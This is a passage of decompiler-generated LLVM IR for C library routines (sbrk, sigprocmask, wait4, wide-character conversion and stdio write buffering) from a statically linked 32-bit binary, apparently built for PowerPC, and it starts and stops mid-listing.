  %v0_10007420 = phi i32 [ %v0_100073f4, %dec_label_pc_100073ec ], [ -1, %dec_label_pc_10007404 ]
  ret i32 %v0_10007420

; uselistorder directives
  uselistorder label %dec_label_pc_10007410, { 1, 0 }
  uselistorder label %dec_label_pc_100073ec, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_10007430 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_10007430

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_open, { 2, 0, 1 }
  uselistorder i32 577, { 1, 2, 0, 3 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_10007450 = load i32, i32* @global_var_1001d89c.424, align 4
  %v3_10007454 = icmp eq i32 %v3_10007450, 0
  br i1 %v3_10007454, label %dec_label_pc_1000745c, label %dec_label_pc_10007468

dec_label_pc_1000745c:                            ; preds = %entry
  store i32 268465248, i32* @lr, align 4
  %v1_1000745c = call i32 @__GI_brk(i32 0)
  %v1_10007460 = icmp slt i32 %v1_1000745c, 0
  br i1 %v1_10007460, label %dec_label_pc_10007488, label %dec_label_pc_1000745c.dec_label_pc_10007468_crit_edge

dec_label_pc_1000745c.dec_label_pc_10007468_crit_edge: ; preds = %dec_label_pc_1000745c
  %v0_10007468.pre = load i32, i32* @r30, align 4
  %v3_1000746c.pre = load i32, i32* @global_var_1001d89c.424, align 4
  br label %dec_label_pc_10007468

dec_label_pc_10007468:                            ; preds = %dec_label_pc_1000745c.dec_label_pc_10007468_crit_edge, %entry
  %v3_1000746c = phi i32 [ %v3_1000746c.pre, %dec_label_pc_1000745c.dec_label_pc_10007468_crit_edge ], [ %v3_10007450, %entry ]
  %v1_10007474 = phi i32 [ %v0_10007468.pre, %dec_label_pc_1000745c.dec_label_pc_10007468_crit_edge ], [ %arg1, %entry ]
  %v3_10007468 = icmp eq i32 %v1_10007474, 0
  store i32 %v3_1000746c, i32* @r31, align 4
  br i1 %v3_10007468, label %dec_label_pc_1000748c, label %dec_label_pc_1000747c

dec_label_pc_1000747c:                            ; preds = %dec_label_pc_10007468
  %v2_10007474 = add i32 %v1_10007474, %v3_1000746c
  store i32 268465280, i32* @lr, align 4
  %v1_1000747c = call i32 @__GI_brk(i32 %v2_10007474)
  %tmp6 = icmp sgt i32 %v1_1000747c, -1
  br i1 %tmp6, label %dec_label_pc_1000747c.dec_label_pc_1000748c_crit_edge, label %dec_label_pc_10007488

dec_label_pc_1000747c.dec_label_pc_1000748c_crit_edge: ; preds = %dec_label_pc_1000747c
  %v0_10007490.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000748c

dec_label_pc_10007488:                            ; preds = %dec_label_pc_1000747c, %dec_label_pc_1000745c
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000748c

dec_label_pc_1000748c:                            ; preds = %dec_label_pc_1000747c.dec_label_pc_1000748c_crit_edge, %dec_label_pc_10007468, %dec_label_pc_10007488
  %v0_10007490 = phi i32 [ %v0_10007490.pre, %dec_label_pc_1000747c.dec_label_pc_1000748c_crit_edge ], [ %v3_1000746c, %dec_label_pc_10007468 ], [ -1, %dec_label_pc_10007488 ]
  ret i32 %v0_10007490

; uselistorder directives
  uselistorder i32 %v3_1000746c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1000748c, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_100074a4 = icmp eq i32 %arg2, 0
  br i1 %v3_100074a4, label %dec_label_pc_100074e4, label %dec_label_pc_100074cc

dec_label_pc_100074cc:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_100074e4, label %dec_label_pc_100074d4

dec_label_pc_100074d4:                            ; preds = %dec_label_pc_100074cc
  %v0_100074d4 = call i32 @__errno_location()
  %v2_100074dc = inttoptr i32 %v0_100074d4 to i32*
  store i32 22, i32* %v2_100074dc, align 4
  %v0_10007508.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007504

dec_label_pc_100074e4:                            ; preds = %dec_label_pc_100074cc, %entry
  %v0_100074e8 = call i32 @__asm_mfcr()
  %v1_100074ec = and i32 %v0_100074e8, 268435456
  %v3_100074ec = icmp eq i32 %v1_100074ec, 0
  store i32 %v0_100074e8, i32* %r31.global-to-local, align 4
  br i1 %v3_100074ec, label %dec_label_pc_10007504, label %dec_label_pc_100074f8

dec_label_pc_100074f8:                            ; preds = %dec_label_pc_100074e4
  %v0_100074f8 = call i32 @__errno_location()
  %v0_100074fc = load i32, i32* %r31.global-to-local, align 4
  %v2_100074fc = inttoptr i32 %v0_100074f8 to i32*
  store i32 %v0_100074fc, i32* %v2_100074fc, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007504

dec_label_pc_10007504:                            ; preds = %dec_label_pc_100074e4, %dec_label_pc_100074d4, %dec_label_pc_100074f8
  %v0_10007508 = phi i32 [ %v0_100074e8, %dec_label_pc_100074e4 ], [ %v0_10007508.pre, %dec_label_pc_100074d4 ], [ -1, %dec_label_pc_100074f8 ]
  ret i32 %v0_10007508

; uselistorder directives
  uselistorder label %dec_label_pc_10007504, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007534 = call i32 @__asm_mfcr()
  %v1_10007538 = and i32 %v0_10007534, 268435456
  %v3_10007538 = icmp eq i32 %v1_10007538, 0
  store i32 %v0_10007534, i32* %r31.global-to-local, align 4
  br i1 %v3_10007538, label %dec_label_pc_10007550, label %dec_label_pc_10007544

dec_label_pc_10007544:                            ; preds = %entry
  %v0_10007544 = call i32 @__errno_location()
  %v0_10007548 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007548 = inttoptr i32 %v0_10007544 to i32*
  store i32 %v0_10007548, i32* %v2_10007548, align 4
  br label %dec_label_pc_10007550

dec_label_pc_10007550:                            ; preds = %entry, %dec_label_pc_10007544
  %v0_10007560 = phi i32 [ %v0_10007534, %entry ], [ -1, %dec_label_pc_10007544 ]
  ret i32 %v0_10007560

; uselistorder directives
  uselistorder label %dec_label_pc_10007550, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1001d880.426 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10007570 = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_1000758c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1000758c, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10007570, label %dec_label_pc_10007598, label %dec_label_pc_100075a0

dec_label_pc_10007598:                            ; preds = %entry
  %v2_10007598 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007598, i32* @r3, align 4
  br label %dec_label_pc_100075a0

dec_label_pc_100075a0:                            ; preds = %entry, %dec_label_pc_10007598
  %v0_100075a4 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_10007598 ]
  %v2_100075a0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_100075a4, i32* %stack_var_-40, align 4
  store i32 %v2_100075a0, i32* %stack_var_-36, align 4
  store i32 268465584, i32* @lr, align 4
  %v0_100075ac = call i32 @__GI_wcsnrtombs()
  %v3_100075b0 = icmp eq i32 %v0_100075ac, 0
  br i1 %v3_100075b0, label %dec_label_pc_100075b8, label %dec_label_pc_100075bc

dec_label_pc_100075b8:                            ; preds = %dec_label_pc_100075a0
  br label %dec_label_pc_100075bc

dec_label_pc_100075bc:                            ; preds = %dec_label_pc_100075a0, %dec_label_pc_100075b8
  %v0_100075c8 = phi i32 [ %v0_100075ac, %dec_label_pc_100075a0 ], [ 1, %dec_label_pc_100075b8 ]
  ret i32 %v0_100075c8

; uselistorder directives
  uselistorder label %dec_label_pc_100075bc, { 1, 0 }
  uselistorder label %dec_label_pc_100075a0, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_100075cc = load i32, i32* @r6, align 4
  store i32 %v0_100075cc, i32* @r7, align 4
  %v0_100075d0 = load i32, i32* @r5, align 4
  store i32 %v0_100075d0, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_100075d8 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_100075d8

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100075dc = load i32, i32* @r3, align 4
  %v3_100075dc = icmp eq i32 %v0_100075dc, 0
  %v0_100075e0 = load i32, i32* @lr, align 4
  store i32 %v0_100075e0, i32* %r0.global-to-local, align 4
  br i1 %v3_100075dc, label %dec_label_pc_10007608, label %dec_label_pc_100075f0

dec_label_pc_100075f0:                            ; preds = %entry
  %v1_100075f0 = load i32, i32* @r4, align 4
  %v4_100075f0 = icmp eq i32 %v0_100075dc, %v1_100075f0
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_100075f0, label %dec_label_pc_100075fc, label %dec_label_pc_10007634

dec_label_pc_100075fc:                            ; preds = %dec_label_pc_100075f0
  %v2_10007600 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10007600, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007634

dec_label_pc_10007608:                            ; preds = %entry
  %v2_1000760011 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000760011, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10007634

dec_label_pc_10007614:                            ; preds = %dec_label_pc_10007674.dec_label_pc_10007654_crit_edge, %dec_label_pc_10007654.preheader
  %v0_10007614 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10007620 = inttoptr i32 %v0_10007614 to i32*
  store i32 84, i32* %v2_10007620, align 4
  %v0_10007698.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007694

dec_label_pc_10007628:                            ; preds = %dec_label_pc_10007664
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10007684.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10007680

dec_label_pc_10007634:                            ; preds = %dec_label_pc_100075fc, %dec_label_pc_100075f0, %dec_label_pc_10007608
  %v2_100076647 = phi i32 [ %v2_10007600, %dec_label_pc_100075fc ], [ %v0_100075dc, %dec_label_pc_100075f0 ], [ %v2_1000760011, %dec_label_pc_10007608 ]
  %v0_10007634 = load i32, i32* @r5, align 4
  %v1_10007634 = load i32, i32* @r6, align 4
  %v3_10007634 = icmp ugt i32 %v0_10007634, %v1_10007634
  br i1 %v3_10007634, label %dec_label_pc_1000763c, label %dec_label_pc_10007640

dec_label_pc_1000763c:                            ; preds = %dec_label_pc_10007634
  store i32 %v1_10007634, i32* @r5, align 4
  br label %dec_label_pc_10007640

dec_label_pc_10007640:                            ; preds = %dec_label_pc_10007634, %dec_label_pc_1000763c
  %v0_1000764c = phi i32 [ %v0_10007634, %dec_label_pc_10007634 ], [ %v1_10007634, %dec_label_pc_1000763c ]
  %v1_10007640 = add i32 %v0_1000764c, 1
  store i32 %v1_10007640, i32* %r0.global-to-local, align 4
  %v0_10007644 = load i32, i32* @r4, align 4
  %v1_10007644 = inttoptr i32 %v0_10007644 to i32*
  %v2_10007644 = load i32, i32* %v1_10007644, align 4
  store i32 %v2_10007644, i32* %r11.global-to-local, align 4
  store i32 %v0_1000764c, i32* %r9.global-to-local, align 4
  store i32 %v0_1000764c, i32* %ctr.global-to-local, align 4
  %v2_1000767c3 = icmp eq i32 %v0_1000764c, 0
  br i1 %v2_1000767c3, label %dec_label_pc_10007680, label %dec_label_pc_10007654.preheader

dec_label_pc_10007654.preheader:                  ; preds = %dec_label_pc_10007640
  %v1_1000765416 = inttoptr i32 %v2_10007644 to i32*
  %v2_1000765417 = load i32, i32* %v1_1000765416, align 4
  store i32 %v2_1000765417, i32* %r0.global-to-local, align 4
  %v1_1000765818 = add i32 %v2_10007644, 4
  store i32 %v1_1000765818, i32* %r11.global-to-local, align 4
  %v2_1000765c20 = icmp ugt i32 %v2_1000765417, 127
  br i1 %v2_1000765c20, label %dec_label_pc_10007614, label %dec_label_pc_10007664.lr.ph

dec_label_pc_10007664.lr.ph:                      ; preds = %dec_label_pc_10007654.preheader
  %extract.t = trunc i32 %v2_1000765417 to i8
  br label %dec_label_pc_10007664

dec_label_pc_10007664:                            ; preds = %dec_label_pc_10007664.lr.ph, %dec_label_pc_10007674.dec_label_pc_10007654_crit_edge
  %v2_1000765423.off0 = phi i8 [ %extract.t, %dec_label_pc_10007664.lr.ph ], [ %extract.t24, %dec_label_pc_10007674.dec_label_pc_10007654_crit_edge ]
  %v2_1000766422 = phi i32 [ %v2_100076647, %dec_label_pc_10007664.lr.ph ], [ %v2_10007674, %dec_label_pc_10007674.dec_label_pc_10007654_crit_edge ]
  %v3_10007664 = inttoptr i32 %v2_1000766422 to i8*
  store i8 %v2_1000765423.off0, i8* %v3_10007664, align 1
  %v0_10007668 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007668 = urem i32 %v0_10007668, 256
  store i32 %v1_10007668, i32* %r0.global-to-local, align 4
  %v3_1000766c = icmp eq i32 %v1_10007668, 0
  br i1 %v3_1000766c, label %dec_label_pc_10007628, label %dec_label_pc_10007674

dec_label_pc_10007674:                            ; preds = %dec_label_pc_10007664
  %v0_10007674 = load i32, i32* @r3, align 4
  %v1_10007674 = load i32, i32* %r10.global-to-local, align 4
  %v2_10007674 = add i32 %v1_10007674, %v0_10007674
  store i32 %v2_10007674, i32* @r3, align 4
  %v0_10007678 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007678 = add i32 %v0_10007678, -1
  store i32 %v1_10007678, i32* %r9.global-to-local, align 4
  %v0_1000767c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000767c = add i32 %v0_1000767c, -1
  store i32 %v1_1000767c, i32* %ctr.global-to-local, align 4
  %v2_1000767c = icmp eq i32 %v1_1000767c, 0
  br i1 %v2_1000767c, label %dec_label_pc_10007680, label %dec_label_pc_10007674.dec_label_pc_10007654_crit_edge

dec_label_pc_10007674.dec_label_pc_10007654_crit_edge: ; preds = %dec_label_pc_10007674
  %v0_10007654.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10007654 = inttoptr i32 %v0_10007654.pre to i32*
  %v2_10007654 = load i32, i32* %v1_10007654, align 4
  store i32 %v2_10007654, i32* %r0.global-to-local, align 4
  %v1_10007658 = add i32 %v0_10007654.pre, 4
  store i32 %v1_10007658, i32* %r11.global-to-local, align 4
  %v2_1000765c = icmp ugt i32 %v2_10007654, 127
  %extract.t24 = trunc i32 %v2_10007654 to i8
  br i1 %v2_1000765c, label %dec_label_pc_10007614, label %dec_label_pc_10007664

dec_label_pc_10007680:                            ; preds = %dec_label_pc_10007674, %dec_label_pc_10007640, %dec_label_pc_10007628
  %v0_10007684 = phi i32 [ %v0_10007684.pre, %dec_label_pc_10007628 ], [ %v2_100076647, %dec_label_pc_10007640 ], [ %v2_10007674, %dec_label_pc_10007674 ]
  %v2_10007680 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10007680, i32* %r0.global-to-local, align 4
  %v4_10007684 = icmp eq i32 %v0_10007684, %v2_10007680
  br i1 %v4_10007684, label %dec_label_pc_10007690, label %dec_label_pc_1000768c

dec_label_pc_1000768c:                            ; preds = %dec_label_pc_10007680
  %v0_1000768c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000768c = load i32, i32* @r4, align 4
  %v2_1000768c = inttoptr i32 %v1_1000768c to i32*
  store i32 %v0_1000768c, i32* %v2_1000768c, align 4
  br label %dec_label_pc_10007690

dec_label_pc_10007690:                            ; preds = %dec_label_pc_10007680, %dec_label_pc_1000768c
  %v0_10007690 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007690 = load i32, i32* @r5, align 4
  %v2_10007690 = sub i32 %v1_10007690, %v0_10007690
  store i32 %v2_10007690, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007694

dec_label_pc_10007694:                            ; preds = %dec_label_pc_10007614, %dec_label_pc_10007690
  %v0_10007698 = phi i32 [ %v0_10007698.pre, %dec_label_pc_10007614 ], [ %v2_10007690, %dec_label_pc_10007690 ]
  store i32 %v0_100075e0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10007698

; uselistorder directives
  uselistorder i32 %v1_1000767c, { 1, 0 }
  uselistorder i32 %v2_10007674, { 0, 2, 1 }
  uselistorder i32 %v1_10007668, { 1, 0 }
  uselistorder i32 %v0_1000764c, { 2, 3, 0, 1 }
  uselistorder i32 %v2_100076647, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10007694, { 1, 0 }
  uselistorder label %dec_label_pc_10007690, { 1, 0 }
  uselistorder label %dec_label_pc_10007664, { 1, 0 }
  uselistorder label %dec_label_pc_10007640, { 1, 0 }
  uselistorder label %dec_label_pc_10007634, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_100076a8 = load i32, i32* @lr, align 4
  store i32 %v0_100076a8, i32* %r0.global-to-local, align 4
  %v0_100076b4 = load i32, i32* @r5, align 4
  store i32 %v0_100076b4, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_100076b4, i32* @r31, align 4
  %v3_100076c83 = icmp eq i32 %v0_100076b4, 0
  store i32 %v0_100076b4, i32* @r27, align 4
  br i1 %v3_100076c83, label %dec_label_pc_10007770, label %dec_label_pc_100076d8

dec_label_pc_100076d8:                            ; preds = %entry, %dec_label_pc_100076f8
  %v0_100076e8 = phi i32 [ %v2_100076f8, %dec_label_pc_100076f8 ], [ %arg2, %entry ]
  %v1_100076d8.in = phi i32 [ %v2_100076fc, %dec_label_pc_100076f8 ], [ %v0_100076b4, %entry ]
  %v1_100076d8 = icmp sgt i32 %v1_100076d8.in, 0
  br i1 %v1_100076d8, label %dec_label_pc_100076e4, label %dec_label_pc_100076dc

dec_label_pc_100076dc:                            ; preds = %dec_label_pc_100076d8
  br label %dec_label_pc_100076e4

dec_label_pc_100076e4:                            ; preds = %dec_label_pc_100076d8, %dec_label_pc_100076dc
  %v0_100076e4 = load i32, i32* @r30, align 4
  %v1_100076e4 = add i32 %v0_100076e4, 4
  %v2_100076e4 = inttoptr i32 %v1_100076e4 to i32*
  %v3_100076e4 = load i32, i32* %v2_100076e4, align 4
  store i32 268465904, i32* @lr, align 4
  %v3_100076ec = call i32 @__libc_write(i32 %v3_100076e4, i32 %v0_100076e8)
  %v1_100076f0 = icmp slt i32 %v3_100076ec, 0
  br i1 %v1_100076f0, label %dec_label_pc_10007704, label %dec_label_pc_100076f8

dec_label_pc_100076f8:                            ; preds = %dec_label_pc_100076e4
  %v0_100076f8 = load i32, i32* @r29, align 4
  %v2_100076f8 = add i32 %v0_100076f8, %v3_100076ec
  store i32 %v2_100076f8, i32* @r29, align 4
  %v1_100076fc = load i32, i32* @r31, align 4
  %v2_100076fc = sub i32 %v1_100076fc, %v3_100076ec
  store i32 %v2_100076fc, i32* @r31, align 4
  %v3_100076c8 = icmp eq i32 %v2_100076fc, 0
  store i32 %v2_100076fc, i32* @r27, align 4
  br i1 %v3_100076c8, label %dec_label_pc_100076c8.dec_label_pc_10007770.loopexit_crit_edge, label %dec_label_pc_100076d8

dec_label_pc_10007704:                            ; preds = %dec_label_pc_100076e4
  %v0_10007704 = load i32, i32* @r30, align 4
  %v1_10007704 = add i32 %v0_10007704, 8
  %v2_10007704 = inttoptr i32 %v1_10007704 to i32*
  %v3_10007704 = load i32, i32* %v2_10007704, align 4
  store i32 %v3_10007704, i32* %r11.global-to-local, align 4
  %v1_10007708 = add i32 %v0_10007704, 12
  %v2_10007708 = inttoptr i32 %v1_10007708 to i32*
  %v3_10007708 = load i32, i32* %v2_10007708, align 4
  store i32 %v3_10007708, i32* %r0.global-to-local, align 4
  %v1_1000770c = inttoptr i32 %v0_10007704 to i16*
  %v2_1000770c = load i16, i16* %v1_1000770c, align 2
  %v2_10007710 = sub i32 %v3_10007708, %v3_10007704
  store i32 %v2_10007710, i32* %r0.global-to-local, align 4
  %v5_10007710 = icmp eq i32 %v2_10007710, 0
  %v1_10007714 = or i16 %v2_1000770c, 8
  store i16 %v1_10007714, i16* %v1_1000770c, align 2
  br i1 %v5_10007710, label %dec_label_pc_10007704.dec_label_pc_1000776c_crit_edge, label %dec_label_pc_10007720

dec_label_pc_10007704.dec_label_pc_1000776c_crit_edge: ; preds = %dec_label_pc_10007704
  %v0_1000776c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000776c

dec_label_pc_10007720:                            ; preds = %dec_label_pc_10007704
  %v0_10007720 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007720 = load i32, i32* @r31, align 4
  %v3_10007720 = icmp ugt i32 %v0_10007720, %v1_10007720
  br i1 %v3_10007720, label %dec_label_pc_10007720.dec_label_pc_1000772c_crit_edge, label %dec_label_pc_10007728

dec_label_pc_10007720.dec_label_pc_1000772c_crit_edge: ; preds = %dec_label_pc_10007720
  %v0_1000772c.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000772c

dec_label_pc_10007728:                            ; preds = %dec_label_pc_10007720
  store i32 %v0_10007720, i32* @r27, align 4
  br label %dec_label_pc_1000772c

dec_label_pc_1000772c:                            ; preds = %dec_label_pc_10007720.dec_label_pc_1000772c_crit_edge, %dec_label_pc_10007728
  %v0_1000772c = phi i32 [ %v0_1000772c.pre, %dec_label_pc_10007720.dec_label_pc_1000772c_crit_edge ], [ %v0_10007720, %dec_label_pc_10007728 ]
  store i32 %v0_1000772c, i32* %ctr.global-to-local, align 4
  %v2_10007738.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007730

dec_label_pc_10007730:                            ; preds = %dec_label_pc_10007754, %dec_label_pc_1000772c
  %v2_10007738 = phi i32 [ %v1_10007754, %dec_label_pc_10007754 ], [ %v2_10007738.pre, %dec_label_pc_1000772c ]
  %v0_10007730 = load i32, i32* @r29, align 4
  %v1_10007730 = inttoptr i32 %v0_10007730 to i8*
  %v2_10007730 = load i8, i8* %v1_10007730, align 1
  %v3_10007730 = zext i8 %v2_10007730 to i32
  store i32 %v3_10007730, i32* %r0.global-to-local, align 4
  %v1_10007734 = add i32 %v0_10007730, 1
  store i32 %v1_10007734, i32* @r29, align 4
  %v3_10007738 = inttoptr i32 %v2_10007738 to i8*
  store i8 %v2_10007730, i8* %v3_10007738, align 1
  %v0_1000773c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000773c = urem i32 %v0_1000773c, 256
  store i32 %v1_1000773c, i32* %r0.global-to-local, align 4
  %v3_10007740 = icmp eq i32 %v1_1000773c, 10
  br i1 %v3_10007740, label %dec_label_pc_10007748, label %dec_label_pc_10007754

dec_label_pc_10007748:                            ; preds = %dec_label_pc_10007730
  %v0_10007748 = load i32, i32* @r30, align 4
  %v1_10007748 = inttoptr i32 %v0_10007748 to i16*
  %v2_10007748 = load i16, i16* %v1_10007748, align 2
  %v3_10007748 = zext i16 %v2_10007748 to i32
  store i32 %v3_10007748, i32* %r0.global-to-local, align 4
  %v1_1000774c = and i32 %v3_10007748, 256
  %v3_1000774c = icmp eq i32 %v1_1000774c, 0
  br i1 %v3_1000774c, label %dec_label_pc_10007754, label %dec_label_pc_10007748.dec_label_pc_1000775c_crit_edge

dec_label_pc_10007748.dec_label_pc_1000775c_crit_edge: ; preds = %dec_label_pc_10007748
  %v0_10007760.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000775c

dec_label_pc_10007754:                            ; preds = %dec_label_pc_10007748, %dec_label_pc_10007730
  %v0_10007754 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007754 = add i32 %v0_10007754, 1
  store i32 %v1_10007754, i32* %r11.global-to-local, align 4
  %v0_10007758 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007758 = add i32 %v0_10007758, -1
  store i32 %v1_10007758, i32* %ctr.global-to-local, align 4
  %v2_10007758 = icmp eq i32 %v1_10007758, 0
  br i1 %v2_10007758, label %dec_label_pc_10007754.dec_label_pc_1000775c_crit_edge, label %dec_label_pc_10007730

dec_label_pc_10007754.dec_label_pc_1000775c_crit_edge: ; preds = %dec_label_pc_10007754
  %v0_1000775c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000775c

dec_label_pc_1000775c:                            ; preds = %dec_label_pc_10007748.dec_label_pc_1000775c_crit_edge, %dec_label_pc_10007754.dec_label_pc_1000775c_crit_edge
  %v0_10007760 = phi i32 [ %v1_10007754, %dec_label_pc_10007754.dec_label_pc_1000775c_crit_edge ], [ %v0_10007760.pre, %dec_label_pc_10007748.dec_label_pc_1000775c_crit_edge ]
  %v0_1000775c = phi i32 [ %v0_1000775c.pre, %dec_label_pc_10007754.dec_label_pc_1000775c_crit_edge ], [ %v0_10007748, %dec_label_pc_10007748.dec_label_pc_1000775c_crit_edge ]
  %v1_1000775c = add i32 %v0_1000775c, 8
  %v2_1000775c = inttoptr i32 %v1_1000775c to i32*
  %v3_1000775c = load i32, i32* %v2_1000775c, align 4
  store i32 %v3_1000775c, i32* %r0.global-to-local, align 4
  %v2_10007760 = add i32 %v0_1000775c, 16
  %v3_10007760 = inttoptr i32 %v2_10007760 to i32*
  store i32 %v0_10007760, i32* %v3_10007760, align 4
  %v0_10007764 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007764 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007764 = sub i32 %v1_10007764, %v0_10007764
  store i32 %v2_10007764, i32* %r0.global-to-local, align 4
  %v1_10007768 = load i32, i32* @r31, align 4
  %v2_10007768 = sub i32 %v1_10007768, %v2_10007764
  store i32 %v2_10007768, i32* @r31, align 4
  br label %dec_label_pc_1000776c

dec_label_pc_1000776c:                            ; preds = %dec_label_pc_10007704.dec_label_pc_1000776c_crit_edge, %dec_label_pc_1000775c
  %v0_1000776c = phi i32 [ %v0_1000776c.pre, %dec_label_pc_10007704.dec_label_pc_1000776c_crit_edge ], [ %v2_10007768, %dec_label_pc_1000775c ]
  %v1_1000776c = load i32, i32* @r28, align 4
  %v2_1000776c = sub i32 %v1_1000776c, %v0_1000776c
  store i32 %v2_1000776c, i32* @r28, align 4
  br label %dec_label_pc_10007770

dec_label_pc_100076c8.dec_label_pc_10007770.loopexit_crit_edge: ; preds = %dec_label_pc_100076f8
  %v0_10007774.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10007770

dec_label_pc_10007770:                            ; preds = %entry, %dec_label_pc_100076c8.dec_label_pc_10007770.loopexit_crit_edge, %dec_label_pc_1000776c
  %v0_10007774 = phi i32 [ %v2_1000776c, %dec_label_pc_1000776c ], [ %v0_10007774.pre.pre, %dec_label_pc_100076c8.dec_label_pc_10007770.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_100076a8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10007774

; uselistorder directives
  uselistorder i32 %v0_1000775c, { 1, 0 }
  uselistorder i32 %v1_10007758, { 1, 0 }
  uselistorder i32 %v1_10007754, { 0, 2, 1 }
  uselistorder i32 %v1_1000773c, { 1, 0 }
  uselistorder i32 %v2_100076fc, { 1, 3, 2, 0 }
  uselistorder i32 %v2_100076f8, { 1, 0 }
  uselistorder i32 %v3_100076ec, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 2, 1, 5 }
  uselistorder label %dec_label_pc_10007770, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000776c, { 1, 0 }
  uselistorder label %dec_label_pc_1000775c, { 1, 0 }
  uselistorder label %dec_label_pc_1000772c, { 1, 0 }
  uselistorder label %dec_label_pc_100076e4, { 1, 0 }
  uselistorder label %dec_label_pc_100076d8, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
